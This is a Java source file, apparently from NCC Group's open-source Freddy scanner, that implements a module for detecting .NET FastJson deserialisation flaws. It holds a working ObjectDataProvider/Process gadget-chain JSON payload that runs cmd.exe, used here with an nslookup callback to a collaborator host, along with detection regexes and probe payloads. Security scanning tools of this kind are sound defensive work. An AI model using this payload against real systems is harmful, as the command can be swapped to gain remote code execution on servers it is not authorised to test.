// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the .NET FastJson library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class FastJsonModule extends FreddyModuleBase {
    //ObjectDataProvider payload data
    private static final String OBJD_PREFIX = "{\"$types\":{\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35\":\"1\",\"System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089\":\"2\", \"System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089\":\"3\"},\"$type\":\"1\",\"ObjectInstance\":{\"$type\":\"2\",\"StartInfo\":{\"$type\":\"3\",\"FileName\":\"cmd.exe\",\"Arguments\":\"/c ";
    private static final String OBJD_SUFFIX = "\"}},\"MethodName\":\"Start\"}";

    protected void initialiseModule() {
        setName("FastJson");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        registerPassiveScanIndicator(Pattern.compile("((\")|(%22))((\\$)|(%24))types((\")|(%22))"), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("fastJSON.deserializer.ToObject", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("{\"$types\":{\"\":\"\"}}", "fastJSON.deserializer.ToObject");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;
        }
        return null;
    }
}
